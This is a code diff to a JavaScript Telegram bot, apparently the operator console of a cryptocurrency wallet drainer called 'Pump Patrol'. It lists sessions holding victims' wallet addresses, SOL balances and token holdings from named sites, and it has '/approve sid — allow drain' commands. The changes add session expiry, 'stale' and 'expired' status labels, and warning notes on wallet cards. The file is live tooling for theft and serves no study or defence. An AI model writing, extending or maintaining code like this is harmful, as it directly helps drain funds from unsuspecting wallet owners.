@@ -14,7 +14,13 @@ const t0=Date.now();
 const api=async(m,b)=>{try{const r=await fetch(`https://api.telegram.org/bot${TG}/${m}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(b||{})});return await r.json()}catch(e){return null}};
 const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 const sessions=new Map(),verdicts=new Map();
-setInterval(()=>{const n=Date.now();for(const[k,v]of sessions)if(!v.done&&n-v.ts>36e5)sessions.delete(k);for(const[k,v]of verdicts)if(n-v.ts>36e5)verdicts.delete(k)},6e4).unref();
+setInterval(()=>{const n=Date.now();
+  for(const[k,v]of sessions){
+    if(!v.done&&n-v.ts>600000){v.done=true;v.note='expired — no response'}
+    if(v.done&&n-v.ts>36e5)sessions.delete(k);
+  }
+  for(const[k,v]of verdicts)if(n-v.ts>36e5)verdicts.delete(k);
+},6e4).unref();
 
 let offset=0;
 (async()=>{
@@ -45,12 +51,14 @@ async function handle(m){
   if(c==='/start'||c==='/help')return reply('Pump Patrol control node\n/sessions — live + recent sessions\n/clear — drop stale sessions (or /clear sid)\n/approve sid — allow drain\n/skip sid — decline');
   if(c==='/sessions'){
     if(!sessions.size)return reply('no sessions recorded');
+    const n=Date.now();
     let s='';
     for(const[k,v]of sessions){
       const w2=v.wallets||[];
       const sol=w2.reduce((a,w)=>a+(+w.sol||0),0);
       const nt=w2.reduce((a,w)=>a+((w.tokens||[]).length),0);
-      s+=`<code>${esc(k)}</code> ${v.done?'done':'live'} — ${esc(v.site||'?')} — ${sol.toFixed(4)} SOL + ${nt} tok\n`;
+      const label=v.done?(v.note==='expired — no response'?'expired':'done'):((!w2.length&&n-v.ts>300000)?'stale':'live');
+      s+=`<code>${esc(k)}</code> ${label} — ${esc(v.site||'?')} — ${sol.toFixed(4)} SOL + ${nt} tok\n`;
     }
     return reply(`<b>sessions</b>\n${s}`);
   }
@@ -81,6 +89,7 @@ function readyCard(sid,r){
   let shown=0;
   for(const w of ws){
     s+='\n'+esc(w.name)+' <code>'+esc(w.addr)+'</code>\n'+w.sol+' SOL';
+    if(w.note)s+='\n⚠ '+esc(w.note);
     for(const t of w.tokens||[]){
       if(shown>=14){s+='\n· …and '+((w.tokens||[]).length-shown)+' more';break}
       s+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt);shown++;
